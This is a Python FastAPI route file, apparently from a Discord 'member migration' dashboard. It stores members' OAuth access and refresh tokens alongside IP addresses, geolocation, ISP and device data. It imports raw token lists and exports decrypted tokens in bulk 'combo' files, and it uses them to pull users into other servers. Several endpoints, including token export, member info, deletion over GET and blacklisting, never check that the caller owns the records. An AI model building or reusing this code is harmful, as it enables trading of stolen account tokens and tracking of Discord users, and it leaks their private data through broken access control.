import math
import uuid
import json
import logging
from datetime import datetime, timedelta
from typing import Optional, List
import httpx
from fastapi import APIRouter, Depends, Request, Form, Query, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, RedirectResponse, Response, JSONResponse
from fastapi.templating import Jinja2Templates
from sqlalchemy import select, func, delete
from sqlalchemy.ext.asyncio import AsyncSession

from database.session import get_db, async_session_factory
from database.models import User, Bot, PullTask, MemberToken, GuildConfig, Blacklist
from web.routes.auth import require_login
from services.bot_manager import BotManager
from services.migration_service import MigrationService
from core.security import encrypt_secret, decrypt_secret

logger = logging.getLogger("freecord.web.migrations")
router = APIRouter()
templates = Jinja2Templates(directory="templates")


@router.get("/migrations", response_class=HTMLResponse)
async def migrations_dashboard(
    request: Request,
    page: int = Query(1, ge=1),
    q: Optional[str] = Query(None),
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    from core.access_control import get_user_accessible_bot_ids, get_user_bot_permissions
    bot_ids = await get_user_accessible_bot_ids(db, current_user)

    page_size = 10
    search_clause = None
    if q and q.strip():
        q_term = f"%{q.strip()}%"
        search_clause = (
            MemberToken.username.ilike(q_term) |
            MemberToken.user_id.ilike(q_term) |
            MemberToken.ip_address.ilike(q_term) |
            MemberToken.country.ilike(q_term) |
            MemberToken.isp.ilike(q_term)
        )

    if not bot_ids:
        total_verified = 0
        total_pages = 1
        tasks = []
        members = []
        active_tokens = 0
        vpn_flagged = 0
        completed_restores = 0
        available_bots = []
    else:
        base_filter = MemberToken.bot_id.in_(bot_ids)
        combined_filter = (base_filter) & (search_clause) if search_clause is not None else base_filter

        total_verified = await db.scalar(select(func.count(MemberToken.id)).where(combined_filter)) or 0
        total_pages = max(1, math.ceil(total_verified / page_size))
        if page > total_pages:
            page = total_pages
        offset = (page - 1) * page_size

        stmt_tasks = select(PullTask).where(PullTask.bot_id.in_(bot_ids)).order_by(PullTask.created_at.desc())
        res_tasks = await db.execute(stmt_tasks)
        tasks = res_tasks.scalars().all()

        stmt_members = select(MemberToken).where(combined_filter).order_by(MemberToken.verified_at.desc()).offset(offset).limit(page_size)
        res_members = await db.execute(stmt_members)
        members = list(res_members.scalars().all())

        from core.security import account_age_days, parse_user_agent
        for m in members:
            acc_age = account_age_days(m.user_id) if m.user_id else 0.0
            try:
                snowflake_val = int(m.user_id)
                created_timestamp = ((snowflake_val >> 22) + 1420070400000) / 1000.0
                created_at_dt = datetime.utcfromtimestamp(created_timestamp).strftime("%b %d, %Y %H:%M UTC")
            except Exception:
                created_at_dt = "Unknown"


            extra = {}
            if m.extra_info_json:
                try:
                    extra = json.loads(m.extra_info_json)
                except Exception:
                    extra = {}

            ua_parsed = parse_user_agent(m.user_agent)

            info_dict = {
                "id": m.id,
                "user_id": m.user_id,
                "username": m.username,
                "discriminator": m.discriminator,
                "email": m.email or "None provided",
                "avatar": m.avatar or "https://cdn.discordapp.com/embed/avatars/0.png",
                "account_created_at": created_at_dt,
                "account_age_days": round(acc_age, 1),
                "account_age_years": round(acc_age / 365.25, 2),
                "verified_at": m.verified_at.strftime("%b %d, %Y %H:%M UTC") if m.verified_at else "Recently",
                "scopes": m.scopes,
                "source_guild_id": m.source_guild_id or "Direct",
                "ip_address": m.ip_address or "127.0.0.1",
                "country": m.country or "Unknown",
                "country_code": m.country_code or "XX",
                "city": m.city or "Unknown",
                "region": extra.get("region", "Unknown"),
                "zip": extra.get("zip", ""),
                "timezone": extra.get("timezone", "UTC"),
                "lat": extra.get("lat"),
                "lon": extra.get("lon"),
                "isp": m.isp or "Unknown",
                "org": extra.get("org", m.isp or "Unknown"),
                "asn": m.asn or "Unknown",
                "user_agent": m.user_agent or "None recorded",
                "os": m.device_os or ua_parsed.get("os", "Unknown OS"),
                "browser": m.device_browser or ua_parsed.get("browser", "Unknown Browser"),
                "device_type": m.device_type or ua_parsed.get("device", "Desktop"),
                "accept_language": extra.get("accept_language", ""),
                "is_vpn": m.is_vpn,
                "is_cellular": m.is_cellular,
                "is_blacklisted": m.is_blacklisted,
                "leave_count": m.leave_count or 0,
                "last_guild_left_at": m.last_guild_left_at.strftime("%b %d, %Y %H:%M UTC") if m.last_guild_left_at else "Never",
            }
            m.info_json = json.dumps(info_dict)

        active_tokens = await db.scalar(select(func.count(MemberToken.id)).where((MemberToken.bot_id.in_(bot_ids)) & (MemberToken.is_blacklisted == False))) or 0
        vpn_flagged = await db.scalar(select(func.count(MemberToken.id)).where((MemberToken.bot_id.in_(bot_ids)) & (MemberToken.is_vpn == True))) or 0
        raw_restored = await db.scalar(select(func.sum(PullTask.success_count)).where(PullTask.bot_id.in_(bot_ids))) or 0
        completed_restores = min(raw_restored, total_verified)

        active_instances = BotManager.get_all_active_bots()
        available_bots = []
        for bot_id, client in active_instances.items():
            if bot_id in bot_ids and client.is_ready():
                perms = await get_user_bot_permissions(db, current_user, bot_id)
                allowed_guilds = perms.get("allowed_guilds", ["ALL"])
                guilds = [
                    {"id": str(g.id), "name": g.name} for g in client.guilds
                    if "ALL" in allowed_guilds or str(g.id) in allowed_guilds
                ]
                tok_res = await db.execute(
                    select(func.count(MemberToken.id)).where(
                        (MemberToken.bot_id == bot_id) & (MemberToken.is_blacklisted == False)
                    )
                )
                count = tok_res.scalar() or 0

                available_bots.append({
                    "id": bot_id,
                    "name": client.user.name if client.user else f"Bot {bot_id}",
                    "guilds": guilds,
                    "verified_count": count,
                })

        if not available_bots:
            all_bots = (await db.execute(select(Bot).where((Bot.id.in_(bot_ids)) & (Bot.is_active == True)))).scalars().all()
            for b in all_bots:
                count = await db.scalar(select(func.count(MemberToken.id)).where(MemberToken.bot_id == b.id)) or 0
                guild_configs = (await db.execute(select(GuildConfig).where(GuildConfig.bot_id == b.id))).scalars().all()
                guilds = [{"id": g.guild_id, "name": g.guild_name} for g in guild_configs]
                available_bots.append({
                    "id": b.id,
                    "name": b.name,
                    "guilds": guilds,
                    "verified_count": count,
                })

    return templates.TemplateResponse(
        request=request,
        name="migrations.html",
        context={
            "user": current_user,
            "tasks": tasks,
            "members": members,
            "total_verified": total_verified,
            "active_tokens": active_tokens,
            "vpn_flagged": vpn_flagged,
            "completed_restores": completed_restores,
            "available_bots": available_bots,
            "page": page,
            "total_pages": total_pages,
            "has_prev": page > 1,
            "has_next": page < total_pages,
            "prev_page": page - 1,
            "next_page": page + 1,
            "q": q or "",
        },
    )


@router.post("/migrations/create")
async def create_migration_task(
    bot_id: int = Form(...),
    target_guild_id: str = Form(""),
    target_guild_ids: Optional[str] = Form(None),
    amount: Optional[str] = Form(None),
    min_stay_days: Optional[int] = Form(0),
    schedule_time: Optional[str] = Form(None),
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    raw_guilds = target_guild_ids if target_guild_ids and target_guild_ids.strip() else target_guild_id
    guild_list = [g.strip() for g in raw_guilds.split(",") if g.strip()]
    if not guild_list:
        return RedirectResponse(url="/migrations?error=Please+select+at+least+one+target+server", status_code=303)

    parsed_amount = None
    if amount and amount.strip().isdigit():
        parsed_amount = max(1, int(amount.strip()))

    scheduled_dt = None
    if schedule_time and schedule_time.strip():
        try:
            scheduled_dt = datetime.fromisoformat(schedule_time.strip())
        except Exception:
            pass

    created_tasks = []
    is_scheduled = scheduled_dt is not None and scheduled_dt > datetime.utcnow()

    for g_id in guild_list:
        task_uuid = f"pull_{uuid.uuid4().hex[:10]}"
        token_stmt = select(func.count(MemberToken.id)).where(
            (MemberToken.bot_id == bot_id) & (MemberToken.is_blacklisted == False)
        )
        tok_res = await db.execute(token_stmt)
        total_available = tok_res.scalar() or 0
        total_count = min(total_available, parsed_amount) if parsed_amount else total_available

        task = PullTask(
            task_uuid=task_uuid,
            bot_id=bot_id,
            target_guild_id=g_id,
            total_members=total_count,
            status="SCHEDULED" if is_scheduled else "PENDING",
            delay_ms=1000,
            batch_size=10,
            min_stay_days=min_stay_days or 0,
            scheduled_for=scheduled_dt,
        )
        db.add(task)
        created_tasks.append(task_uuid)

    await db.commit()

    if not is_scheduled:
        for t_uuid in created_tasks:
            await MigrationService.start_pull_task(t_uuid, limit_count=parsed_amount, min_stay_days=min_stay_days or 0)

    first_uuid = created_tasks[0] if created_tasks else ""
    msg = f"Started+{len(created_tasks)}+member+migration(s)" if not is_scheduled else f"Scheduled+{len(created_tasks)}+migration(s)"
    return RedirectResponse(url=f"/migrations?active={first_uuid}&success={msg}", status_code=303)


@router.post("/migrations/import-tokens")
async def import_member_tokens(
    bot_id: int = Form(...),
    raw_tokens: str = Form(...),
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    imported = 0
    errors = 0
    lines = [line.strip() for line in raw_tokens.strip().splitlines() if line.strip()]

    async with httpx.AsyncClient(timeout=10.0) as client:
        for line in lines:
            try:
                access_tok = None
                refresh_tok = ""
                user_id = None
                username = "Imported Member"

                if line.startswith("{") and line.endswith("}"):
                    data = json.loads(line)
                    access_tok = data.get("access_token")
                    refresh_tok = data.get("refresh_token", "")
                    user_id = str(data.get("user_id", ""))
                    username = data.get("username", "Imported Member")
                elif ":" in line:
                    parts = line.split(":")
                    if len(parts) >= 3:
                        user_id, access_tok, refresh_tok = parts[0], parts[1], parts[2]
                    elif len(parts) == 2:
                        user_id, access_tok = parts[0], parts[1]
                else:
                    access_tok = line

                if not access_tok:
                    errors += 1
                    continue

                if not user_id or user_id == "None":
                    res = await client.get(
                        "https://discord.com/api/v10/users/@me",
                        headers={"Authorization": f"Bearer {access_tok}"}
                    )
                    if res.status_code == 200:
                        u_data = res.json()
                        user_id = str(u_data["id"])
                        username = u_data.get("username", "Discord User")
                    else:
                        errors += 1
                        continue

                existing = (await db.execute(
                    select(MemberToken).where(
                        (MemberToken.user_id == user_id) & (MemberToken.bot_id == bot_id)
                    )
                )).scalars().first()

                if existing:
                    existing.access_token_encrypted = encrypt_secret(access_tok)
                    if refresh_tok:
                        existing.refresh_token_encrypted = encrypt_secret(refresh_tok)
                    existing.expires_at = datetime.utcnow() + timedelta(days=7)
                    existing.updated_at = datetime.utcnow()
                else:
                    new_token = MemberToken(
                        user_id=user_id,
                        username=username,
                        access_token_encrypted=encrypt_secret(access_tok),
                        refresh_token_encrypted=encrypt_secret(refresh_tok or access_tok),
                        expires_at=datetime.utcnow() + timedelta(days=7),
                        bot_id=bot_id,
                        country="Imported",
                        isp="Direct Import",
                    )
                    db.add(new_token)
                imported += 1
            except Exception as e:
                logger.warning(f"Error importing token: {e}")
                errors += 1

        await db.commit()

    return RedirectResponse(
        url=f"/migrations?success=Imported+{imported}+member+tokens+({errors}+skipped)",
        status_code=303
    )


@router.post("/migrations/export-tokens")
@router.post("/api/tokens/export")
async def export_member_tokens(
    bot_id: Optional[str] = Form("ALL"),
    export_format: str = Form("combo"),
    only_active: bool = Form(False),
    download: bool = Form(False),
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    stmt = select(MemberToken).order_by(MemberToken.verified_at.desc())
    if bot_id and bot_id != "ALL":
        try:
            stmt = stmt.where(MemberToken.bot_id == int(bot_id))
        except ValueError:
            pass

    if only_active:
        stmt = stmt.where(MemberToken.is_blacklisted == False)

    res = await db.execute(stmt)
    records = res.scalars().all()

    exported_lines = []
    json_objects = []

    for r in records:
        try:
            acc_tok = decrypt_secret(r.access_token_encrypted) if r.access_token_encrypted else ""
            ref_tok = decrypt_secret(r.refresh_token_encrypted) if r.refresh_token_encrypted else ""
        except Exception:
            continue

        if not acc_tok:
            continue

        if export_format == "combo":
            exported_lines.append(f"{r.user_id}:{acc_tok}:{ref_tok}")
        elif export_format == "user_access":
            exported_lines.append(f"{r.user_id}:{acc_tok}")
        elif export_format == "access_only":
            exported_lines.append(acc_tok)
        elif export_format == "json":
            json_objects.append({
                "user_id": r.user_id,
                "username": r.username,
                "access_token": acc_tok,
                "refresh_token": ref_tok,
                "expires_at": r.expires_at.isoformat() if r.expires_at else None,
                "ip_address": r.ip_address,
                "country": r.country,
                "bot_id": r.bot_id,
            })

    if export_format == "json":
        final_content = json.dumps(json_objects, indent=2)
        media_type = "application/json"
        filename = f"freecord_tokens_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.json"
    else:
        final_content = "\n".join(exported_lines)
        media_type = "text/plain"
        filename = f"freecord_tokens_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.txt"

    if download:
        return Response(
            content=final_content,
            media_type=media_type,
            headers={"Content-Disposition": f"attachment; filename={filename}"}
        )

    return JSONResponse({
        "count": len(json_objects) if export_format == "json" else len(exported_lines),
        "filename": filename,
        "content": final_content,
    })


@router.api_route("/members/{member_id}/delete", methods=["GET", "POST"])
async def delete_member_token(
    member_id: int,
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    await db.execute(delete(MemberToken).where(MemberToken.id == member_id))
    await db.commit()
    return RedirectResponse(url="/migrations?success=Member+deleted", status_code=303)


@router.post("/members/{member_id}/blacklist")
async def blacklist_member(
    member_id: int,
    guild_id: Optional[str] = Form("ALL"),
    reason: Optional[str] = Form("Blacklisted by admin"),
    block_ip: Optional[bool] = Form(False),
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    stmt = select(MemberToken).where(MemberToken.id == member_id)
    res = await db.execute(stmt)
    member = res.scalars().first()
    if not member:
        return RedirectResponse(url="/migrations?error=Member+not+found", status_code=303)

    target_guild = None if not guild_id or guild_id.strip() == "ALL" else guild_id.strip()
    clean_reason = reason.strip() if reason else f"Blacklisted by admin ({member.username})"

    member.is_blacklisted = True

    bl_stmt = select(Blacklist).where(
        (Blacklist.type == "USER_ID") & 
        (Blacklist.value == member.user_id) &
        (Blacklist.guild_id == target_guild)
    )
    if not (await db.execute(bl_stmt)).scalars().first():
        db.add(Blacklist(
            type="USER_ID",
            value=member.user_id,
            guild_id=target_guild,
            reason=clean_reason,
            added_by=current_user.username,
        ))

    if block_ip and member.ip_address and member.ip_address not in ["127.0.0.1", "0.0.0.0", "Local Network"]:
        ip_bl_stmt = select(Blacklist).where(
            (Blacklist.type == "IP") & 
            (Blacklist.value == member.ip_address) &
            (Blacklist.guild_id == target_guild)
        )
        if not (await db.execute(ip_bl_stmt)).scalars().first():
            db.add(Blacklist(
                type="IP",
                value=member.ip_address,
                guild_id=target_guild,
                reason=f"IP of blacklisted user {member.username}",
                added_by=current_user.username,
            ))

    try:
        import discord
        client = BotManager.get_bot(member.bot_id)
        if client and client.is_ready():
            guilds_to_ban = []
            if target_guild:
                g = client.get_guild(int(target_guild))
                if g:
                    guilds_to_ban.append(g)
            else:
                guilds_to_ban = list(client.guilds)

            for guild in guilds_to_ban:
                try:
                    await guild.ban(
                        discord.Object(id=int(member.user_id)),
                        reason=f"Blacklisted: {clean_reason}",
                        delete_message_days=0,
                    )
                except Exception:
                    pass
    except Exception:
        pass

    await db.commit()
    scope_text = f"for server {target_guild}" if target_guild else "globally across all servers"
    return RedirectResponse(url=f"/migrations?success=Member+{member.username}+blacklisted+{scope_text}", status_code=303)


@router.post("/members/{member_id}/unblacklist")
@router.api_route("/members/{member_id}/toggle-blacklist", methods=["GET", "POST"])
async def unblacklist_member(
    member_id: int,
    guild_id: Optional[str] = Form(None),
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    stmt = select(MemberToken).where(MemberToken.id == member_id)
    res = await db.execute(stmt)
    member = res.scalars().first()
    if not member:
        return RedirectResponse(url="/migrations?error=Member+not+found", status_code=303)

    if member.is_blacklisted:
        member.is_blacklisted = False
        if member.user_id:
            await db.execute(delete(Blacklist).where(Blacklist.value == str(member.user_id)))
        if member.ip_address:
            await db.execute(delete(Blacklist).where(Blacklist.value == str(member.ip_address)))

        try:
            import discord
            client = BotManager.get_bot(member.bot_id)
            if client and client.is_ready():
                for guild in client.guilds:
                    try:
                        await guild.unban(discord.Object(id=int(member.user_id)), reason="Unblacklisted by admin")
                    except Exception:
                        pass
        except Exception:
            pass

        await db.commit()
        return RedirectResponse(url=f"/migrations?success=Member+{member.username}+completely+unblacklisted", status_code=303)
    else:
        return await blacklist_member(
            member_id=member_id,
            guild_id=guild_id or "ALL",
            reason="Blacklisted by admin",
            block_ip=False,
            current_user=current_user,
            db=db,
        )


@router.post("/migrations/{task_uuid}/control")
async def control_migration(
    task_uuid: str,
    action: str = Form(...),
    current_user: User = Depends(require_login),
):
    if action == "pause":
        MigrationService.pause_task(task_uuid)
    elif action == "resume":
        MigrationService.resume_task(task_uuid)
    elif action == "stop":
        MigrationService.stop_task(task_uuid)
    return RedirectResponse(url=f"/migrations?active={task_uuid}", status_code=303)


@router.websocket("/ws/migrations/{task_uuid}")
async def migration_task_ws(websocket: WebSocket, task_uuid: str):
    await websocket.accept()
    MigrationService.register_ws(task_uuid, websocket)

    state = MigrationService.get_task_state(task_uuid)
    if state:
        try:
            await websocket.send_json(state)
        except Exception:
            pass
    else:
        async with async_session_factory() as db:
            stmt = select(PullTask).where(PullTask.task_uuid == task_uuid)
            res = await db.execute(stmt)
            task = res.scalars().first()
            if task:
                logs_list = []
                if task.logs:
                    try:
                        logs_list = json.loads(task.logs)
                    except Exception:
                        logs_list = [task.logs]
                total = task.total_members or 1
                processed = (task.success_count or 0) + (task.already_in_guild_count or 0) + (task.failed_count or 0)
                progress = int((processed / max(total, 1)) * 100) if total > 0 else 100
                initial_state = {
                    "status": task.status,
                    "progress": progress,
                    "processed": processed,
                    "total": total,
                    "success": task.success_count or 0,
                    "already": task.already_in_guild_count or 0,
                    "already_in": task.already_in_guild_count or 0,
                    "failed": task.failed_count or 0,
                    "rate_limits": task.rate_limited_count or 0,
                    "rate_limited": task.rate_limited_count or 0,
                    "speed": 0.0,
                    "logs": logs_list,
                }
                try:
                    await websocket.send_json(initial_state)
                except Exception:
                    pass

    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        pass
    except Exception as e:
        logger.debug(f"WS disconnected for task {task_uuid}: {e}")
    finally:
        MigrationService.unregister_ws(task_uuid, websocket)


@router.get("/api/migrations/{task_uuid}/status")
async def get_migration_task_status(
    task_uuid: str,
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    state = MigrationService.get_task_state(task_uuid)
    if state:
        return state

    stmt = select(PullTask).where(PullTask.task_uuid == task_uuid)
    res = await db.execute(stmt)
    task = res.scalars().first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    logs_list = []
    if task.logs:
        try:
            logs_list = json.loads(task.logs)
        except Exception:
            logs_list = [task.logs]
    total = task.total_members or 1
    processed = (task.success_count or 0) + (task.already_in_guild_count or 0) + (task.failed_count or 0)
    progress = int((processed / max(total, 1)) * 100) if total > 0 else 100
    return {
        "status": task.status,
        "progress": progress,
        "processed": processed,
        "total": total,
        "success": task.success_count or 0,
        "already": task.already_in_guild_count or 0,
        "already_in": task.already_in_guild_count or 0,
        "failed": task.failed_count or 0,
        "rate_limits": task.rate_limited_count or 0,
        "rate_limited": task.rate_limited_count or 0,
        "speed": 0.0,
        "logs": logs_list,
    }


@router.get("/api/members/{member_id}/info")
async def get_member_full_info(
    member_id: int,
    current_user: User = Depends(require_login),
    db: AsyncSession = Depends(get_db),
):
    stmt = select(MemberToken).where(MemberToken.id == member_id)
    res = await db.execute(stmt)
    m = res.scalars().first()
    if not m:
        raise HTTPException(status_code=404, detail="Member not found")

    from core.security import account_age_days, parse_user_agent
    acc_age = account_age_days(m.user_id) if m.user_id else 0.0

    try:
        snowflake_val = int(m.user_id)
        created_timestamp = ((snowflake_val >> 22) + 1420070400000) / 1000.0
        created_at_dt = datetime.utcfromtimestamp(created_timestamp).strftime("%b %d, %Y %H:%M UTC")
    except Exception:
        created_at_dt = "Unknown"


    extra = {}
    if m.extra_info_json:
        try:
            extra = json.loads(m.extra_info_json)
        except Exception:
            extra = {}

    ua_parsed = parse_user_agent(m.user_agent)

    return {
        "id": m.id,
        "user_id": m.user_id,
        "username": m.username,
        "discriminator": m.discriminator,
        "email": m.email or "None provided",
        "avatar": m.avatar,
        "account_created_at": created_at_dt,
        "account_age_days": round(acc_age, 1),
        "account_age_years": round(acc_age / 365.25, 2),
        "verified_at": m.verified_at.strftime("%b %d, %Y %H:%M UTC") if m.verified_at else "Recently",
        "scopes": m.scopes,
        "source_guild_id": m.source_guild_id or "Direct",
        "ip_address": m.ip_address or "127.0.0.1",
        "country": m.country or "Unknown",
        "country_code": m.country_code or "XX",
        "city": m.city or "Unknown",
        "region": extra.get("region", "Unknown"),
        "zip": extra.get("zip", ""),
        "timezone": extra.get("timezone", "UTC"),
        "lat": extra.get("lat"),
        "lon": extra.get("lon"),
        "isp": m.isp or "Unknown",
        "org": extra.get("org", m.isp or "Unknown"),
        "asn": m.asn or "Unknown",
        "user_agent": m.user_agent or "None recorded",
        "os": m.device_os or ua_parsed.get("os", "Unknown OS"),
        "browser": m.device_browser or ua_parsed.get("browser", "Unknown Browser"),
        "device_type": m.device_type or ua_parsed.get("device", "Desktop"),
        "accept_language": extra.get("accept_language", ""),
        "is_vpn": m.is_vpn,
        "is_cellular": m.is_cellular,
        "is_blacklisted": m.is_blacklisted,
        "leave_count": m.leave_count or 0,
        "last_guild_left_at": m.last_guild_left_at.strftime("%b %d, %Y %H:%M UTC") if m.last_guild_left_at else "Never",
    }
